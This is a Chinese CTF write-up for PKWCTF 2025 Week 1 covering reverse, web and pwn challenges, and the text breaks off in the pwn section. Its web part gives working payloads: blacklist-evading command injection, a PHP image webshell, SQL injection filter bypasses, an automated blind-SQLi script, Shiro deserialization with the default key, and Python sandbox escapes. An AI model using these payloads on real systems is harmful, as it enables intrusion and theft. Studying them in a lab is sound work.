# [个人] PKWCTF2025的WriteUp (复现)

PKWSEC2025校赛复现，将逐步完善题目



# Week1

## Reverse

### **CQのxor**

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v3; // r13
  char *v4; // r12
  unsigned __int64 v5; // rbx
  size_t v6; // rax
  char s[60]; // [rsp+0h] [rbp-60h] BYREF
  int i; // [rsp+3Ch] [rbp-24h]

  puts("Do you know about bitwise operations? They're common in reverse, especially XOR.");
  puts("Now please give me your flag:");
  fgets(s, 45, _bss_start);
  s[strcspn(s, "\n")] = 0;
  for ( i = 0; i <= 30; ++i )
  {
    v3 = s[i];
    v4 = key;
    v5 = i;
    v6 = strlen(key);
    if ( (char)(v3 ^ v4[v5 % v6]) + i != str[i] )
    {
      puts("Please try again!");
      exit(0);
    }
  }
  puts("Good job!");
  return 0;
}
```

**数据搜集**

```assembly
.data:0000000000004090 key             dq offset aCqHandsomeBoy
```

```assembly
.rodata:0000000000002008 aCqHandsomeBoy  db 'CQ_handsome_boy',0  ; DATA XREF: .data:key↓o
```

```assembly
.data:0000000000004060 str             db 33h, 3Bh, 2Ah, 1Eh, 8, 12h, 25h, 2Bh, 8, 23h, 44h, 11h
.data:0000000000004060                                         ; DATA XREF: main+BC↑o
.data:000000000000406C                 db 5Eh, 27h, 34h, 3Eh, 44h, 30h, 2Ch, 22h, 70h, 15h, 42h
.data:0000000000004077                 db 43h, 54h, 70h, 1Ah, 55h, 3Ch, 28h, 5Ch, 11h dup(0)
```

**编写最终脚本**

```python
def getFlag(str, key):
    flag = []
    key_len = len(key)
    for i in range(31):
        sub_value = str[i] - i
        key_char_ord = ord(key[i % key_len])
        flag_char = chr(sub_value ^ key_char_ord)
        flag.append(flag_char)
    return ''.join(flag)

key = "CQ_handsome_boy"
str = [
    51, 59, 42, 30, 8, 18, 37, 43, 8, 35,
    68, 17, 94, 39, 52, 62, 68, 48, 44, 34,
    112, 21, 66, 67, 84, 112, 26, 85, 60, 40,
    92
]

if __name__ == "__main__":
    print(getFlag(str, key))
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
pkwsec{Wow_Y0u_le@rn2d_CQ2_XOr}

进程已结束，退出代码为 0
```

**得到：pkwsec{Wow_Y0u_le@rn2d_CQ2_XOr}**



### [中等]帮我投喂一下JvavSer先生

#### 解题过程

**见官网WP**

**得到：pkwsec{3718ad6bc71cfa7084df1a9258c165b086f0405be010e6eae37127b70ceaa3eb}**



## Web

### Easyrce

#### 解题过程

**查看题目**

```php
<?php
highlight_file('index.php');

#一句话木马，神神又奇奇

if(isset($_POST['J'])){
    $call=$_POST['J'];
    $dangerous_commands = ['cat', 'tac', 'head', 'nl', 'more', 'less', 'tail', 'vi', 'sed', 'od'];
    foreach ($dangerous_commands as $command) {
        if (preg_match("/$command/i", $call)) {
            die("这些个危险函数可不兴使啊");
        }
    }
    system($call);
}
?>
```

**发送payload**

```shell
J=ls /
```

```shell
bin dev etc f14g home lib media mnt opt proc root run run.sh sbin srv sys tmp usr var
```

```shell
J=grep . /f14g
```

```shell
pkwsec{9a294186-c4a9-4f4c-90c6-c329879e193b}
```

```shell
J=awk '{print}' /f14g
```

```
pkwsec{9a294186-c4a9-4f4c-90c6-c329879e193b}
```

```shell
J=echo Y2F0IC9mMTRn | base64 -d | sh # cat /f14g的Base64
```

```
pkwsec{9a294186-c4a9-4f4c-90c6-c329879e193b}
```

**得到：pkwsec{9a294186-c4a9-4f4c-90c6-c329879e193b}**



### easy-upload1

#### 解题过程

**查看题目**

```shell
挑战规则
前端只允许上传图像文件（jpg, jpeg, png, gif）
文件大小不能超过 2MB
尝试上传PHP文件以获取flag
上传后的文件存储在服务器上的upload目录中
服务器端不做任何文件类型检查
```

**编写图片马**

编写`php.php`

```php
<?=`cat /flag`;
```

改名`php.php` -> `flag.png`

**上传图片马**

上传`flag.png`

多次用`bp`截获数据，修改文件名`flag.png`为`flag.php`

访问`http://fliaz.top:32798/upload/flag.php`

得到响应数据`pkwsec{eba8ce35-4c7a-41e4-b206-813241df82b7}`

**得到：pkwsec{eba8ce35-4c7a-41e4-b206-813241df82b7}**



### easy-upload2

#### 解题过程

**编写图片马**

```php
<?=`cat /flag`;
```

```shell
copy /b png.png + php.php payload.png
```

**上传图片马**

得到路径`uploads/6947e76f58322.png`

访问`http://fliaz.top:32816/uploads/6947e76f58322.png`

得到响应`pkwsec{7eb2f65d-0384-4d06-9aff-5390483b7e80}`

**得到：pkwsec{7eb2f65d-0384-4d06-9aff-5390483b7e80}**



### sql-1小栗子学姐的食谱

#### 解题过程

**测试漏洞**

```shell
Chestnut'--
```

```shell
ID: 4
姓名: 小栗子学姐 (Chestnut)
邮箱: chestnut@chef-whale.com
职位: 👑 管理员
```

```shell
Chestnut' order by 10--
```

```shell
查询错误: 1st ORDER BY term out of range - should be between 1 and 5
```

**查看提示**

```shell
提示：系统可能存在安全隐患，尝试找出漏洞来证明系统的危险性。 小栗子学姐(Chestnut)的星辰布丁食谱密码就藏在系统中...
```

**分析**

- 抓住关键词`密码`

**漏洞利用**

```shell
Chestnut' union select all password,null,null,null,null from users--
```

```shell
ID: pkwsec{cc470d76-66bf-4538-9c91-f286a1dd9edb}
姓名: None
邮箱: None
职位: 👨‍🍳 会员
```

**得到：pkwsec{cc470d76-66bf-4538-9c91-f286a1dd9edb}**



### sql2-怎么才能绕过呢？

#### 解题过程

**测试漏洞**

```shell
Chestnut' order by 10--
```

```shell
（过滤后: Chestnut' der by 10）
```

**分析**

- 可用看到它过滤了很多字符比如`--`、`#`、`or`等
- 但是它这些都是单次过滤
- 我们可以利用`#`将黑名单分割开来

```shell
Chestnut' o#rder by 10-#-
```

```shell
查询错误: 1st ORDER BY term out of range - should be between 1 and 5
```

**漏洞利用**

```shell
Chestnut' u#nion s#elect passwo#rd,null,null,null,null f#rom users-#-
```

```shell
ID: pkwsec{ab34fccb-5106-4002-9e15-3e8ec24e9bc2}
姓名: None
邮箱: None
职位: 👨‍🍳 会员
```

**得到：pkwsec{ab34fccb-5106-4002-9e15-3e8ec24e9bc2}**



### sql3-无声的攻防

#### 解题过程

**查看提示**

```shell
挑战目标：
小栗子学姐(Chestnut)的星辰布丁食谱密码仍然藏在数据库中！
你需要通过布尔盲注技术，在只有"用户存在"/"用户不存在"响应的情况下，逐字符猜解出她的密码。

技术提示：
使用 substr(password,1,1) 猜解第一个字符
使用 length(password) 猜解密码长度
通过响应差异推断每个字符的值
你需要编写脚本自动化这个过程
```

**抓包查看**

```shell
请求 URL
http://fliaz.top:32864/
请求方法
POST
状态代码
200 OK
远程地址
8.137.163.212:32864
引用站点策略
strict-origin-when-cross-origin
```

```shell
username=Doraemon
```

**漏洞测试**

```shell
Doraemon'--
```

```shell
Right 用户存在
```

**编写最终脚本**

```python
import time
import requests
import fake_useragent

def getFlagFromSqlBlindBet(url: str, key: str = "id", field: str = "id", fieldLength: int = 1, table: str = "users", flagFormat: str = "flag{}", flagLength: int = 1, rightMark: str = "Right", isPost: bool = True, sleepTime: int = 100) -> str:

    # 初始化变量
    flag = flagFormat[:flagFormat.__len__() - 1]
    flagContentIndex = flagFormat.__len__()
    global response

    # 遍历 flag 长度
    while True:
        try:
            data = {key: rf"' union select all {field}{",null" * (fieldLength - 1)} from {table} where length({field}) >= {flagLength} --"}
            if isPost:
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
            else:
                response = requests.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
            
            if response.content.decode().__contains__(rightMark):
                print(f"已遍历flag长度: {flagLength}")
                flagLength += 1
            else:
                flagLength -= 1
                print(f"找到flag长度: {flagLength}")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(sleepTime)

    # 遍历 flag 内容
    while flag.__len__() < flagLength - 1:
        i = 33
        while i < 126 + 1:
            try:
                data = {field: rf"' union select all {field}{", null" * (fieldLength - 1)} from {table} where substr({field}, 1, {flagFormat.__len__() - 1}) = '{flagFormat[:flagFormat.__len__() - 1]}' and substr({field}, {flagContentIndex}, 1) = '{chr(i)}' --"}
                response = requests.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data)
                if response.content.decode().__contains__("Right"):
                    flag += chr(i)
                    print(f"找到flag第{flagContentIndex}个字符为{chr(i)+"("+i+")"}: {flag + flagFormat[-1]}")
                    flagContentIndex += 1
                    break
                else:
                    print(f"已遍历flag第{flagContentIndex}个字符{chr(i)+"("+i+")"}")
                    i += 1
            except requests.exceptions.ConnectionError:
                time.sleep(sleepTime)
    flag += flagFormat[-1]
    
    print(f"得到flag: {flag}")
    return flag

if __name__ == "__main__":
    print(getFlagFromSqlBlindBet("http://fliaz.top:32864/", flagFormat = "pkwsec{}", flagLength = 44))
```

**运行最终脚本**

```shell
pkwsec{e07a2421-2373-4b95-b7b0-18cd93749c1d}
```

**得到：pkwsec{e07a2421-2373-4b95-b7b0-18cd93749c1d}**



### web5-Shiro

#### 解题过程

**查看提示**

```shell
漏洞信息:
• Shiro版本: 1.2.4
• 默认密钥: kPH+bIxk5D2deZiIxcaaaA==
```

登录后抓包查看标头

**查看标头**

```shell
请求 URL
http://fliaz.top:32874/doLogin
请求方法
POST
状态代码
200 OK
远程地址
8.137.163.212:32874
引用站点策略
strict-origin-when-cross-origin
connection
keep-alive
content-type
application/json
date
Wed, 24 Dec 2025 09:21:10 GMT
keep-alive
timeout=60
set-cookie
rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 23-Dec-2025 09:21:10 GMT
set-cookie
rememberMe=tj6AR+DPaVOfHxz2Gc04WPX+3X9miro943EmoKooSVj7cnlgF51Z2nvh38tRFgVec5kQ9OkGBsTzF4bv3FBjsg7RW0q79hO8o4osmHwwlUm8UT+GW08eqwhRDPMV7SP8fRyb5N/HPxErT/cWj1ApA88cyqj9vvXt5nauYWvPIYsWgsCAMmXAszm+4FDkKx85m39gJYHPg6vUTIjNSEO/uV8fGSNxaopAidaGbNdIvwtZ4plXV16NQ4mqZchEcFFw+DD0BtxBl5+hJ+Axik38QW83F7f/byLnWUJH3hOtjLtciCIdYPQvX5FqGW3C3K6i0p3eYsuLzBACnzNxhcD+/ActmaR0HRk0QCZ8zBC1pJwFmkpR5XtYyOWtUMSQr9jnuDvmUuxKg+Md1J6VVNqirDwRGMGgVWSmjWdBOkYnjeSaFVbVvONCzZQxrkrCSGy1pd/Zr2CdvZrvQMMKxoVMSJkUjwTqvySJgJiK7lqQmNIdq2Ib5YuR67xXiZ2ok3qEz0c4lLCGfX3hHSndH51axQ==; Path=/; Max-Age=2592000; Expires=Fri, 23-Jan-2026 09:21:10 GMT; HttpOnly
transfer-encoding
chunked
accept
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
accept-encoding
gzip, deflate
accept-language
zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
cache-control
no-cache
connection
keep-alive
content-length
44
content-type
application/x-www-form-urlencoded
cookie
JSESSIONID=1DBA535B4DF75FA1A527BFD9012FFCD1; rememberMe=9SEUzYbuIzg38xj5zq/edeUVXmlSNSJq6gTsrxJXSWUAUiB/hxEd11s8oqjJztgHYyJ6QUTCjlwLEksAsUW0d1OwWsB1bkunSC8qpSgvvBlOt6RoIRAWzpjERlLxyusIiHKyAI8IHgDeqp14kHVVp/1v1abGvf37pClCuhO6Apj91S4IzeW8TgMlk8ySffG69ug5BccPX4Yksl9evL5h7bdexe9SEfQzX7KQzu5SabgBMDAxzAnwY/qzz5pkfcxxU1JX8zf4ev48+ySs/isigXN3IbOUcuv6L9/E2A9/4tfxpLdjsi1QzsY8V6YOth4Vp6XHQE1RxmZr0KPKd4q5w1bXMo319jBl8un2lyexRly20lWgghqYRi3PoTTg2opLpCuIjPTYJWzeI9yJ5drAmnl+608tP83QH60BwJmgNnZsMsnDCxL5oGHzINzKV181t4RAuiNbU3ngP4hJboOT+zE14tZZi7H/EEwl2uX53Qqh21RV7Kz2oMP5/qf5I8NiFIatpeVDCIquC6by7HTqDg==
dnt
1
host
fliaz.top:32874
origin
http://fliaz.top:32874
pragma
no-cache
referer
http://fliaz.top:32874/login
upgrade-insecure-requests
1
user-agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0
```

**分析**

- 看到`cookie`存在`rememberMe`字段，可利用执行`payload`

**工具利用**

```shell
shiro反序列化漏洞综合利用工具
```

**设置**

- 请求地址：`http://fliaz.top:32873/doLogin`
- 请求方式：`GET`
- 关键字：`rememberMe`
- 指定密钥：`kPH+bIxk5D2deZiIxcaaaA==`

**漏洞利用**

```shell
ls
```

```shell
flag
shiro-deserialization-ctf.jar
```

```shell
cat flag
```

```shell
pkwsec{f3d11f53-83cb-4fa8-aa2b-3eb3a5300598}
```

**得到：pkwsec{f3d11f53-83cb-4fa8-aa2b-3eb3a5300598}**



### pyjail1-小栗子的监狱1

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32779
```

```shell
================================================================================
                    Welcome to the PyJail Challenge!
================================================================================

         鈿狅笍  BLACKLISTED WORDS:
             import, os, system, subprocess, sh, flag

          Chestnut: You must study Python hard all day.
--------------------------------------------------------------------------------

>>>
```

**分析**

- 有黑名单的`python`沙箱越狱

**数据搜集**

```python
().__class__.__bases__[0].__subclasses__()
```

```shell
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'ast.AST'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>]
```

找到`<class 'os._wrap_close'>`位于第`137`位

**最终payload**

```shell
().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /fl'+'ag').read()
```

```shell
pkwsec{d5fa297d-313a-4da0-ab5b-90dbe89b60bb}
```

```shell
exec("error = ().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /fl'+'ag').read();raise Exception(f'{error}')")
```

```shell
pkwsec{d5fa297d-313a-4da0-ab5b-90dbe89b60bb}
```

**得到：pkwsec{d5fa297d-313a-4da0-ab5b-90dbe89b60bb}**



### pyjail2-小栗子的监狱2

#### 解题过程

**查看题目**

```shell
nc fliaz.top 32782
```

```shell
================================================================================
                    Welcome to the PyJail Challenge!
================================================================================

         鈿狅笍  BLACKLISTED WORDS:
             import, os, system, subprocess, sh, flag, open, eval, exec

          Chestnut: This time you are not allowed to execute the command.
--------------------------------------------------------------------------------

>>>
```

**分析**

- 它禁用了`open`，所有`payload`里不能直接出现`popen`

**数据搜集**

```shell
().__class__.__bases__[0].__subclasses__()
```

```shell
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'ast.AST'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>]
```

找到`<class 'os._wrap_close'>`位于第`137`位

```python
print(ord('o'))
```

```shell
111
```

找到`o`的ASCII码为`111`

**最终payload**

```python
().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['p'+chr(111)+'pen']('cat /fl'+'ag').read()
```

```shell
pkwsec{e3f94ade-ae83-4243-94df-a54806fe1adf}
```

**得到：pkwsec{e3f94ade-ae83-4243-94df-a54806fe1adf}**



## Pwn

### Pwn 1: Easy

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**分析**

- linux64位小端序
- 没有Canary

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts(&byte_402768);
  fflush(_bss_start);
  quiz_stage_1();
  quiz_stage_2();
  teach_defense_and_debug();
  vulnerable_function();
  return 0;
}
```

```c
int quiz_stage_1()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  __int64 v4; // rdx
  __int64 v5; // rcx
  __int64 v6; // r8
  __int64 v7; // r9
  char s1[8]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v10; // [rsp+8h] [rbp-38h]
  __int64 v11; // [rsp+10h] [rbp-30h]
  __int64 v12; // [rsp+18h] [rbp-28h]
  __int64 v13; // [rsp+20h] [rbp-20h]
  __int64 v14; // [rsp+28h] [rbp-18h]
  __int64 v15; // [rsp+30h] [rbp-10h]
  __int64 v16; // [rsp+38h] [rbp-8h]

  *(_QWORD *)s1 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  puts("\x1B[36m==========================================");
  puts(asc_402118);
  printf("==========================================\n\x1B[0m");
  puts(&byte_402180);
  puts(asc_4021E0);
  printf("\x1B[33m> \x1B[0m");
  fflush(_bss_start);
  ((void (__fastcall *)(char *, __int64, __int64, __int64, __int64, __int64))safe_read_input)(s1, 64LL, v0, v1, v2, v3);
  if ( strcmp(s1, "64-bit") )
  {
    printf(a31m_0, "64-bit", v4, v5, v6, v7, *(_QWORD *)s1, v10, v11, v12, v13, v14, v15, v16);
    exit(1);
  }
  return printf(a32m_0, "64-bit", v4, v5, v6, v7, *(_QWORD *)s1, v10, v11, v12, v13, v14, v15, v16);
}
```

```c
int quiz_stage_2()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  char s1[8]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v6; // [rsp+8h] [rbp-38h]
  __int64 v7; // [rsp+10h] [rbp-30h]
  __int64 v8; // [rsp+18h] [rbp-28h]
  __int64 v9; // [rsp+20h] [rbp-20h]
  __int64 v10; // [rsp+28h] [rbp-18h]
  __int64 v11; // [rsp+30h] [rbp-10h]
  __int64 v12; // [rsp+38h] [rbp-8h]

  *(_QWORD *)s1 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  puts("\x1B[36m\n==========================================");
  puts(asc_4022F0);
  printf("==========================================\n\x1B[0m");
  puts(&byte_402328);
  puts(asc_402378);
